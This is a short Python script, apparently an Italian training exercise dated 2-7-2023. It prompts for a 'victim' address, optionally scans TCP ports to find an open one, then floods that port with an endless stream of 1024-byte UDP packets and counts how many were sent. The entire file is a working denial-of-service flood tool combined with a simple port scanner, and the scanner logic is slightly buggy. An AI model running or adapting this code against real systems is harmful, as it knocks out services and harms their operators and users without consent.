##################################################################
#                                                                #
#                    ESERCIZI 2-7-2023                           #
#                                                                #
################################################################## 

import socket

def FindPort(addr):
	start = input("PORT SCAN\nSTART--> ")
	if(start == ""):
		start = "1"
	end = input("END--> ")
	if(end == ""):
		end = "65535"
	print("Inizio scansione di ", addr, "sulle porte ", start, "-", end)
	
	out = ""
	for port in range(int(start),int(end)):
		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		control = s.connect_ex((addr, port))
		if(control == 0):
			out = port
	return out
		
while True:
	S_ADDR = input ("Indirizzo vittima: ")
	if(S_ADDR == ""):
		S_ADDR = "192.168.32.100"
		
	Cport = input("Conosci la porta? y/n ")
	if(Cport == "y"):
		S_PORT = input ("Porta vittima: ")
	else: 
		S_PORT = FindPort(S_ADDR)
		print("\nPorta aperta: ", S_PORT)
		
	if(S_PORT == ""):
		S_PORT = 443

	print("Invio richieste....")
	control = True
	counter = 0
	while control:
		try:
				
			s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			if(s.sendto(bytes(1024), (S_ADDR, int(S_PORT))) == -1):
				print("Impossibile connettersi.")
				break
			counter += 1
			if((counter % 10000) == 0):
				print("Hai effettuato ", counter, " richieste.")
		except KeyboardInterrupt:
			print("\nIn totale hai effettuato ", counter, " richieste.\nAll'indirizzo: ", S_ADDR, "\nPorta: ", S_PORT)
			control = False
			
	restart = input("Scegli:\n(A)-Riprova\n(D)-Esci\n")
	if(restart != "A"):
		break
	else:
	        continue
	
